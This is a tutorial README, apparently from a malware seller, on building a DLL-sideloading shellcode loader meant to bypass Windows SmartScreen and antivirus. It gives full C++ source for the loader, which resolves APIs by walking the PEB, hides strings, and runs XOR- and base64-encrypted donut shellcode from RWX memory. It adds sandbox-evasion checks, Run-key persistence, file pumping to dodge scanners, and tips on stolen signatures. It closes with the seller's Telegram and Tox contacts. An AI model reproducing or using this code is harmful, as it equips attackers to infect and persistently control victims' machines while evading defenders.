# Bypass smartscreen + crypt
<img align="left" src="https://github.com/user-attachments/assets/1b4bcd48-da0e-4c02-8fc9-759d6f154efa" width="450" height="450">

Let's analyze one of the ways to bypass the smart screen and write our own simple cryptor that runs the shellcode

The software that we need to write the code and build it:
- Ida Pro with HexRays [Download](https://web.archive.org/web/20240810212609/https://out5.hex-rays.com/beta90_6ba923/)
- Clion / Visual Studio / Notepad
- MinGW or another compiler

Let's start installing Cliona. Go to the program's website and click the download button, after which you will be redirected to another page with the system selection.
Next, we see the type of installation and select windows, it is possible to download it in a zip or for a specific architecture.
To run clean, go to the bin folder and give it to the executable, or write the path to the file in the chmod +x terminal.

We go to [llvm-mingw](https://github.com/mstorsjo/llvm-mingw) let's go to the releases.

For Windows, choose a compiler without ubuntu and macos attributions with the end x86_x64.
For Linux, choose ubuntu x86_x64.

Compilers for both Windows and Linux are not particularly different in terms of location and file names (in Windows .the exe is being added). In order to add the compiler to Lion, you need to click New Project, because we have a DllSideLoad project, select C++ Library and Shared, for which it is not particularly important because at any time it can be changed in CMakeLists.txt .

After the project is created, go to File, then to Settings.

Next, go to Build / Execution... There we are interested in the ToolChains tab -/- Click on the plus sign there and select System -/- Next, go to the compiler we downloaded and unpack it into some folder.

Next, go back to Clion and enter it in the fields

C Compiler if you want to build a 64-bit exe / dll -> folder path/bin/x86_64-w64-mingw32-gcc / If the 32-bit folder path is/bin/i686-w64-mingw32-gcc
C++ Compiler if you want to build a 64-bit exe / dll -> folder path/bin/x86_64-w64-mingw32-g++ / If the 32-bit folder path is/bin/i686-w64-mingw32-g++

Drag your added compiler to the top if you want it to be used by default, the compiler is configured. We proceed to the step of searching for a vulnerable exe for our pleasures.

### Writing malware code

We already have an open project in Lion, but we haven't finished everything there, we go back to CMakeLists.txt and we will need to add compilation flags so that the library functions normally and does not need other dllks.

Adding the code to CMakeLists.txt after the set

```
set(CMAKE_CXX_FLAGS "-w -s -Oz -ffunction-sections -fdata-sections -Wl,--gc-sections -fvisibility=hidden -mavx2 -mbmi2 -DNDEBUG")

set(CMAKE_CXX_FLAGS "${CMAKE_CXX_FLAGS} -Wno-narrowing")

set(CMAKE_EXE_LINKER_FLAGS "-Wl,--exclude-all-symbols -shared -static-libgcc -static-libstdc++ -Wl,-Bstatic,--whole-archive -lwinpthread -Wl,--no-whole-archive")
```

<img align="center" src="https://github.com/user-attachments/assets/aa679db8-4353-4d90-8364-cf96d695e082" width="1000" height="300">

Also, in order not to rename the dll ourselves every time, add some more code after add_library
Instead of DllSideLoad, your name is from add_library.

```
set_target_properties( DllSideLoad
        PROPERTIES
        OUTPUT_NAME "g2m"
        SUFFIX ".dll")
```

Next we go to our library.cpp file and demolish everything clean. We are doing our import and test MessageBox to check if our idea is working.

```
#include "windows.h"

extern "C" __declspec(dllexport) __attribute__((visibility("default"))) int g2mcomm_winmain(DWORD, int, DWORD, DWORD, DWORD, DWORD){

return 0;
}

BOOL APIENTRY DllMain( HMODULE hModule,DWORD  ul_reason_for_call,LPVOID lpReserved){
switch (ul_reason_for_call) {
case DLL_PROCESS_ATTACH: {
MessageBoxW(NULL, L"Hello from g2m.dll", L"Entry", MB_ICONEXCLAMATION | MB_OK);
}break;
    }
return TRUE;
}
}
```

Build by pressing the hammer in Clion, on Linux you will have a joke that it is wrong to get off, so there we change add_library to add_executable

Next, after the build, we drop the dll next to G2M.exe and we see that it is not rejected as a foreign object and our MessageBox is executed.

### Let's write the simplest shellcode executor and check it further, I would not have been satisfied with it and I chose a slightly different path.

```
PVOID shellcode_exec = VirtualAlloc(0, decrypted_data.length(), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
mem_copy(shellcode_exec, decrypted_data.data(), decrypted_data.length());
DWORD threadID;
HANDLE hThread = CreateThread(NULL, 0, (PTHREAD_START_ROUTINE)shellcode_exec, NULL, 0, &threadID);
WaitForSingleObject(hThread, INFINITE);
```

To begin with, let's hide the receipt of the PEB(Process Environment Block), by default it is __readfsdword(0x30);
But I want to hide this receipt and so that it is not visible that it exists, how can I do this?

```
long addr(){

    return 0x30 * 14;
}
void execute()
{

    long read = addr() / 14;
    PPEB pPEB = (PPEB)__readfsdword(read);
```

Next, we get the library kernel32.dll which contains our functions without GetModuleHandle and LoadLibrary using LDR_DATA_TABLE_ENTRY and the GetProcAdress address, it doesn't make much sense, but still, because we are looking in the list of exported functions.

We will also use a macro to hide the use of memcpy from other libraries:

```
# define memcpy(D,S,N) {char*xxd=(char*)(D);const char*xxs=(const char*)(S);\
                        int xxn=(N);while(xxn-->0)*(xxd++)=*(xxs++);}
```

I will make a test shellcode using -> https://github.com/TheWover/donut having previously decompiled it. We run it and see its arguments.

We are interested in -a - choice of architecture 1 - x32, 2 - x64, and compression -z 2 - aplib, because I have more methods on Linux on Windows, I can use a bagel for Windows using wine. The flag -e by default suits us, -i - input your file, -o output the final file., -f the type of the final file is 3 for our chosen C-like language.

And it turns out that ./donut -a 1 -z 2 -f 3 -i exam shellcode. At the output we will get .h is a file with a shellcode.

Let's import this file #include "name". We get the following final code as a result.

```
#include <winternl.h>
#include "windows.h"
#include "library.h"

void execute();

extern "C" __declspec(dllexport) __attribute__((visibility("default"))) int g2mcomm_winmain(DWORD, int, DWORD, DWORD, DWORD, DWORD){
 
return 0;
}
# define memcpy(D,S,N) {char*xxd=(char*)(D);const char*xxs=(const char*)(S);\
int xxn=(N);while(xxn-->0)*(xxd++)=*(xxs++);}


typedef HMODULE(WINAPI *PGetModuleHandleA)(PCSTR);
typedef FARPROC(WINAPI *PGetProcAddress)(HMODULE, PCSTR);

typedef PVOID(WINAPI *PVirtualAlloc)(PVOID, SIZE_T, DWORD, DWORD);
typedef PVOID(WINAPI *PCreateThread)(PSECURITY_ATTRIBUTES, SIZE_T, PTHREAD_START_ROUTINE, PVOID, DWORD, PDWORD);
typedef PVOID(WINAPI *PWaitForSingleObject)(HANDLE, DWORD);
typedef LPVOID(WINAPI *PVirtualAllocEx)(HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);
typedef HANDLE(WINAPI *PGetCurrentProcess)(VOID);
typedef WINBOOL(WINAPI *PWriteProcessMemory)(HANDLE hProcess, LPVOID lpBaseAddress, LPCVOID lpBuffer, SIZE_T nSize, SIZE_T *lpNumberOfBytesWritten);
long addr(){

return 0x30 * 14;
}

void execute()
{
long read = addr() / 14;
PPEB pPEB = (PPEB)__readfsdword(read);

PPEB_LDR_DATA pLoaderData = pPEB->Ldr;

PLIST_ENTRY listHead = &pLoaderData->InMemoryOrderModuleList;

PLIST_ENTRY listCurrent = listHead->Flink;

PVOID kernel32Address;
do
    {
PLDR_DATA_TABLE_ENTRY dllEntry = CONTAINING_RECORD(listCurrent, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);

DWORD dllNameLength = WideCharToMultiByte(CP_ACP, 0, dllEntry->FullDllName.Buffer, dllEntry->FullDllName.Length, NULL, 0, NULL, NULL);

PCHAR dllName = (PCHAR)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dllNameLength);

WideCharToMultiByte(CP_ACP, 0, dllEntry->FullDllName.Buffer, dllEntry->FullDllName.Length, dllName, dllNameLength, NULL, NULL);

        CharUpperA(dllName);

if (strstr(dllName, "KERNEL32.DLL"))
        {
kernel32Address = dllEntry->DllBase;

HeapFree(GetProcessHeap(), 0, dllName);

break;
        }
HeapFree(GetProcessHeap(), 0, dllName);

listCurrent = listCurrent->Flink;

} while (listCurrent != listHead);

PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)kernel32Address;

PIMAGE_NT_HEADERS pNtHeader = (PIMAGE_NT_HEADERS)((PBYTE)kernel32Address + pDosHeader->e_lfanew);

PIMAGE_OPTIONAL_HEADER pOptionalHeader = (PIMAGE_OPTIONAL_HEADER)&(pNtHeader->OptionalHeader);

PIMAGE_EXPORT_DIRECTORY pExportDirectory = (PIMAGE_EXPORT_DIRECTORY)((PBYTE)kernel32Address + pOptionalHeader->DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

PULONG pAddressOfFunctions = (PULONG)((PBYTE)kernel32Address + pExportDirectory->AddressOfFunctions);
PULONG pAddressOfNames = (PULONG)((PBYTE)kernel32Address + pExportDirectory->AddressOfNames);

PUSHORT pAddressOfNameOrdinals = (PUSHORT)((PBYTE)kernel32Address + pExportDirectory->AddressOfNameOrdinals);


PGetModuleHandleA pGetModuleHandleA = NULL;

PGetProcAddress pGetProcAddress = NULL;


for (int i = 0; i < pExportDirectory->NumberOfNames; ++i)
    {
PCSTR pFunctionName = (PSTR)((PBYTE)kernel32Address + pAddressOfNames[i]);
if (!strcmp(pFunctionName, "GetModuleHandleA"))
        {
pGetModuleHandleA = (PGetModuleHandleA)((PBYTE)kernel32Address + pAddressOfFunctions[pAddressOfNameOrdinals[i]]);

        }
if (!strcmp(pFunctionName, "GetProcAddress"))
        {
pGetProcAddress = (PGetProcAddress)((PBYTE)kernel32Address + pAddressOfFunctions[pAddressOfNameOrdinals[i]]);

        }
    }
HMODULE hKernel32 = pGetModuleHandleA("kernel32.dll");

PVirtualAllocEx funcVirtualAllocEx = (PVirtualAllocEx)pGetProcAddress(hKernel32, "VirtualAllocEx");

PGetCurrentProcess funcGetCurrentProcess = (PGetCurrentProcess)pGetProcAddress(hKernel32, "GetCurrentProcess");

PWriteProcessMemory funcWriteProcessMemory = (PWriteProcessMemory)pGetProcAddress(hKernel32, "WriteProcessMemory");

void* Process = funcGetCurrentProcess();
PVOID allocatedMem = funcVirtualAllocEx(Process,0, sizeof buf, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
if(allocatedMem == nullptr){
exit(EXIT_FAILURE);
    }
SIZE_T bytes;
funcWriteProcessMemory(Process, allocatedMem, (LPCVOID)&buf, sizeof(buf), &bytes);
((void(*)())allocatedMem)();
ExitProcess(0);
}

BOOL APIENTRY DllMain( HMODULE hModule,DWORD  ul_reason_for_call,LPVOID lpReserved){
switch (ul_reason_for_call) {
case DLL_PROCESS_ATTACH: {
MessageBoxW(NULL, L"Hello from g2m.dll", L"Entry", MB_ICONEXCLAMATION | MB_OK);
            execute();
}break;
    }
return TRUE;
}
```

As we can see and can observe, our shellcode has successfully worked and launched our payload.

### In the next steps, we will add string obfuscation and code littering.

To encrypt strings in Compile Time, we will use the repository [Obfuscate](https://github.com/adamyaxley/Obfuscate) 
Copy the code from obfuscate.h or download it and throw it into our project, then #include "obfuscate.h"
To obfuscate a string, it will be enough to write AY_OBFUSCATE and put our string there.

As we can see, just a cloud of garbage code was added to those places where it was empty and the code stretched almost 5 times.

For the cipher of the shellcode itself, you can make the simplest xor method, the Integer value will act as the key, as well as slightly confuse the code by adding rand(), the code will be universal for both decryption and encryption, in theory you can still screw compression, but we already have it in the bagel and it works fine.

```
std::string EncryptDecrypt(const std::string& input, int key) { 
    std::string output = input;
    char a;
    key = rand() % 99;
    for(size_t i = 0; i < input.length(); ++i) {
        a = input[i];
        int b = static_cast<int>(a);
        b ^= key;
        a = static_cast<char>(b);
        output[i] = a;
    }
    return output;
}
```

Now let's create a program for this code to encrypt the shellcode we received.

To do this, add to CMakeLists.txt a few new lines to compile the newly minted .exe encoder

```
set(CMAKE_EXE_LINKER_FLAGS "-Wl,--exclude-all-symbols -static -municode")

add_executable(Encrypter encrypter.cpp)
```

And we are writing code to encrypt the file, to begin with, why did we add the unicode flag? because if the user is an Arab, then he will have far from ansi lines and the application will simply not work and a folder with Latin letters will be needed C:/latin .

```
#include <fstream>

#include <string>

#include <random>

#include <iostream>

#include "library.h"

#include "base64.h"



using namespace std;

std::string read_file_str(std::wstring path) {

std::wifstream wfile = std::wifstream(path.c_str(), std::ios_base::binary | std::ios_base::ate);

std::wstring file_data(wfile.tellg(), '\0');

wfile.seekg(0);

wfile.read((wchar_t *)file_data.data(), file_data.length());

std::string data_ansi = {file_data.begin(),file_data.end()};

return data_ansi;

}


bool write_to_file(const std::wstring& file_name, std::string data) {

std::wofstream output_file = std::wofstream(file_name.c_str(), std::ofstream::binary);


if (!output_file.good()) {

return false;

    }

std::wstring data_unicode = {data.begin(),data.end()};

    output_file.write(data_unicode.c_str(), data_unicode.length());

    output_file.close();


return true;

}


int wmain(int argc, wchar_t* argv[]) {

if(argc < 3){

printf("\nInvalid arguments: count\nUsage: exe,out\nv");

system("PAUSE");

return 0;

    }


string file = read_file_str(argv[1]);

file = EncryptDecrypt(file,default_key);

file = base64_encode(file);

write_to_file(argv[2],file);

system("pause");

}
```
In the code, we read the first 2 arguments input, output and then just get the text from the file to std::string and subsequently encrypt it, and write it using wostream and convert std:;string to std::wstring, that is, from a short string to a wide unicode one.
Updated library.h, where I put default_key and the encryption method of the payload.

```
int default_key = 12345;
std::string EncryptDecrypt(const std::string& input, int key) {
    std::string output = input;
    char a;
    key = rand() % 99;
    for(size_t i = 0; i < input.length(); ++i) {
        a = input[i];
        int b = static_cast<int>(a);
        b ^= key;
        a = static_cast<char>(b);
        output[i] = a;
    }
    return output;
}
```

Next, we added base64.h so that the file was correctly written to disk because we completely broke wstring, and even the windows file library, it simply read the wrong length.

```
static const std::string base64_chars =
        "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
        "abcdefghijklmnopqrstuvwxyz"
        "0123456789+/";

static inline bool is_base64(unsigned char c) {
    return (isalnum(c) || (c == '+') || (c == '/'));
}

inline std::string base64_encode(const std::string &bytes) {
    auto bytes_to_encode = reinterpret_cast<unsigned char const *>(&bytes[0]);
    unsigned int in_len = bytes.size();
    std::string ret;
    int i = 0;
    int j = 0;
    unsigned char char_array_3[3];
    unsigned char char_array_4[4];

    while (in_len--) {
        char_array_3[i++] = *(bytes_to_encode++);
        if (i == 3) {
            char_array_4[0] = (char_array_3[0] & 0xfc) >> 2;
            char_array_4[1] =
                    ((char_array_3[0] & 0x03) << 4) + ((char_array_3[1] & 0xf0) >> 4);
            char_array_4[2] =
                    ((char_array_3[1] & 0x0f) << 2) + ((char_array_3[2] & 0xc0) >> 6);
            char_array_4[3] = char_array_3[2] & 0x3f;

            for (i = 0; (i < 4); i++)
                ret += base64_chars[char_array_4[i]];
            i = 0;
        }
    }

    if (i) {
        for (j = i; j < 3; j++)
            char_array_3[j] = '\0';

        char_array_4[0] = (char_array_3[0] & 0xfc) >> 2;
        char_array_4[1] =
                ((char_array_3[0] & 0x03) << 4) + ((char_array_3[1] & 0xf0) >> 4);
        char_array_4[2] =
                ((char_array_3[1] & 0x0f) << 2) + ((char_array_3[2] & 0xc0) >> 6);
        char_array_4[3] = char_array_3[2] & 0x3f;

        for (j = 0; (j < i + 1); j++)
            ret += base64_chars[char_array_4[j]];

        while ((i++ < 3))
            ret += '=';
    }

    return ret;
}

inline std::string base64_decode(std::string const &encoded_string) {
    int in_len = encoded_string.size();
    int i = 0;
    int j = 0;
    int in_ = 0;
    unsigned char char_array_4[4], char_array_3[3];
    std::string ret;

    while (in_len-- && (encoded_string[in_] != '=') &&
           is_base64(encoded_string[in_])) {
        char_array_4[i++] = encoded_string[in_];
        in_++;
        if (i == 4) {
            for (i = 0; i < 4; i++)
                char_array_4[i] = base64_chars.find(char_array_4[i]);

            char_array_3[0] =
                    (char_array_4[0] << 2) + ((char_array_4[1] & 0x30) >> 4);
            char_array_3[1] =
                    ((char_array_4[1] & 0xf) << 4) + ((char_array_4[2] & 0x3c) >> 2);
            char_array_3[2] = ((char_array_4[2] & 0x3) << 6) + char_array_4[3];

            for (i = 0; (i < 3); i++)
                ret += char_array_3[i];
            i = 0;
        }
    }

    if (i) {
        for (j = i; j < 4; j++)
            char_array_4[j] = 0;

        for (j = 0; j < 4; j++)
            char_array_4[j] = base64_chars.find(char_array_4[j]);

        char_array_3[0] = (char_array_4[0] << 2) + ((char_array_4[1] & 0x30) >> 4);
        char_array_3[1] =
                ((char_array_4[1] & 0xf) << 4) + ((char_array_4[2] & 0x3c) >> 2);
        char_array_3[2] = ((char_array_4[2] & 0x3) << 6) + char_array_4[3];

        for (j = 0; (j < i - 1); j++)
            ret += char_array_3[j];
    }

    return ret;
}
```

Now, in the same don't run the same command, just remove the argument -a so that the shellcode bin file is generated.

<img align="left" src="https://github.com/user-attachments/assets/7d36895a-8717-4a63-94e7-0c3fbda2c71f" width="950" height="150">


Next, we use our compiled Encrypter.exe

The file is saved in your path, then go to any hex editor, for example HxD on Windows, for Linux Okteta. There, select Edit -> Copy as Array C, in HxD, the algorithm is about the same.

Creating a new payload file.h include it and base64.h in library.cpp

```
#include "base64.h"
#include "payload.h"
```

Next, we slightly change the code in library.cpp for the encrypted payload, add base64_decode and decryption + slightly change the code where the virtual is.

```
void* Process = funcGetCurrentProcess();
std::string base_dec = base64_decode(buffer);
std::string buffer_dec = EncryptDecrypt(base_dec,default_key);
PVOID allocatedMem = funcVirtualAllocEx(Process,0, buffer_dec.size(), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
if(allocatedMem == nullptr){
MessageBoxW(NULL, L"Hello from g2m.dll", L"Entry", MB_ICONEXCLAMATION | MB_OK);
exit(EXIT_FAILURE);
}
SIZE_T bytes;
funcWriteProcessMemory(Process, allocatedMem, buffer_dec.c_str(), buffer_dec.size(), &bytes);
((void(*)())allocatedMem)();
ExitProcess(0);
```
### We protect ourselves from the VirusTotal with simple tricks

Everyone is probably being stabbed by bots from the virustotal that are forever knocking on the file, or other AnyRun machines and other similar crap, I decided to show how you can protect yourself from half if you have a Dllka, but you can use it in the exe I think. Let's add a call to GetUserNameA again, I create a typedef.

```
typedef WINBOOL(WINAPI *PGetUserNameA)(LPSTR lpBuffer, LPDWORD pcbBuffer);
PGetUserNameA funcGetUserNameA;

bool CheckUserNames() {
    char *sUsers[] = {(char *) AY_OBFUSCATE("UserName"),
                      (char *) AY_OBFUSCATE("user"),
                      (char *) AY_OBFUSCATE("sandbox"), (char *) AY_OBFUSCATE("honey"), (char *) AY_OBFUSCATE("vmware"),
                      (char *) AY_OBFUSCATE("currentuser"), (char *) AY_OBFUSCATE("nepenthes"),
                      (char *) AY_OBFUSCATE("andy"),
                      (char *) AY_OBFUSCATE("CurrentUser"), (char *) AY_OBFUSCATE("HAL9TH"),
                      (char *) AY_OBFUSCATE("JohnDoe")};

    char szBuffer[30];
    unsigned long lSize = sizeof(szBuffer);

    if (funcGetUserNameA(szBuffer, &lSize) == 0) {
        return (1);
    }

    for (int i = 0; i < (sizeof(sUsers) / sizeof(char *)); i++) {
        if (strstr(szBuffer, sUsers[i])) {
            return 1;
        }
    }
    return 0;
}
```

Since this function is located in ADVAPI32, we will need to load it via LoadLibrary

```
typedef HMODULE(WINAPI *PLoadLibraryA)(LPCSTR lpLibFileName);
PLoadLibraryA funcLoadLibraryA = (PLoadLibraryA)pGetProcAddress(hKernel32, AY_OBFUSCATE("LoadLibraryA"));
funcGetUserNameA = (PGetUserNameA)pGetProcAddress(funcLoadLibraryA(AY_OBFUSCATE("ADVAPI32.dll")), AY_OBFUSCATE("GetUserNameA"));
```

This is about how we add a function to our dll, now how else can we be careful, if you look at the zenbox, it always loads your dll via rundll32, respectively, we can simply exclude that our dll was loaded in programs from the system folder or in another way, but it's a bit dumb, but in general the code would look like this.

```
bool contains(const std::wstring& one, const std::wstring& two) {
    return one.find(two)!= std::wstring::npos;
}

void Check(){
wchar_t CurrentFilePath[1024];
GetModuleFileNameW(0, CurrentFilePath, 1024);
if(contains(CurrentFilePath,L"rundll")){
exit(EXIT_FAILURE);
}
}
```

### Adding autoloading

Let's say you have a RAT or another program scripted, how do I make an auto-upload? In general, you can stupidly add a file from the temp directory and the job is done, but there are other ways to autoload.
First, let's create our own pamper code on the pros, yes it will be as non-optimized as possible and it will need time to dump the file, but still, the code stupidly adds a space and writes it to the end of the file in a loop that counts how many megabytes we added.

```
std::wstring Pump(const std::wstring& asmPath, int mb) {
    std::wofstream fileStream(asmPath, std::ios::binary | std::ios::app);

    long fileSizeInBytes = static_cast<long>(mb * 1024 * 1024); // 1MB = 1024 * 1024 bytes

    fileStream.seekp(0, std::ios_base::end);
    long currentPosition = fileStream.tellp();

    long bytesToAdd = fileSizeInBytes - currentPosition;

    while (bytesToAdd > 0) {
        const wchar_t space = L' ';
        fileStream.write(&space, 1);
        bytesToAdd--;
    }

    fileStream.close();

    return asmPath;
}
```

Next, let's do the simplest auto-upload with copying files to the user's directory and a 100mb pump.
First, let's create a method to convert from Str to str.

```
std::wstring strWide(const char* cStr) {
    std::string str = cStr;
    std::wstring wideStr(str.begin(), str.end());
    return wideStr;
}
}
```

Writing the startup code will look something like this, in it we pre-delete the dll if there is no executable and write our new file there, and then check if there is an exe along this path so as not to update many times.

```
bool exists(const std::wstring& path) {
return std::filesystem::exists(path);
}
void EnableAutoRun() {
HKEY hkey;
wchar_t CurrentFilePath[1024];
GetModuleFileNameW(0, CurrentFilePath, 1024);
std::filesystem::path CurrentExe = CurrentFilePath;
wchar_t my_documents[MAX_PATH];
SHGetFolderPathW(NULL, CSIDL_PROFILE, NULL, SHGFP_TYPE_CURRENT, my_documents);
std::filesystem::path documents = my_documents;
std::wstring appPath = CurrentExe.filename();
std::wstring dllPath = strWide(AY_OBFUSCATE("g2m.dll"));
std::wstring updaterDLL = documents / dllPath;
std::wstring updaterEXE = documents / appPath;
if(!exists(updaterEXE)){
        _wremove(updaterDLL.c_str());
std::filesystem::copy_file(dllPath, updaterDLL);
std::filesystem::copy_file(appPath, updaterEXE);
RegCreateKeyExW(HKEY_CURRENT_USER,
strWide(AY_OBFUSCATE("Software\\Microsoft\\Windows\\CurrentVersion\\Run")).c_str(), 0, NULL, 0,
KEY_WRITE, NULL, &hkey, NULL);
RegSetValueExW(hkey, NULL, 0, REG_SZ, (unsigned char *) updaterEXE.c_str(), MAX_PATH);
Pump(updaterDLL, 100);
    }
}
```

We check our code by rebooting the system and it works well.
But there are also other ways to autoload, for example -> rundll32.exe path,Entry in the startup registry instead of our path to the executable file.

The disadvantage of this method lies in the new Smart App Control that appeared in Windows 11, which, however, is easy to do by taking the SignThief signature from the exe where it is revoked, or by erasing part of the signature so that it is written Revoked. To bypass the chrome alert, it will be enough to remember the dll files and add garbage to the archive.

<img align="left" src="https://injectexp.dev/assets/img/logo/logo1.png">
Contacts:
injectexp.dev / 
pro.injectexp.dev / 
Telegram: @Evi1Grey5 [support]
Tox: 340EF1DCEEC5B395B9B45963F945C00238ADDEAC87C117F64F46206911474C61981D96420B72







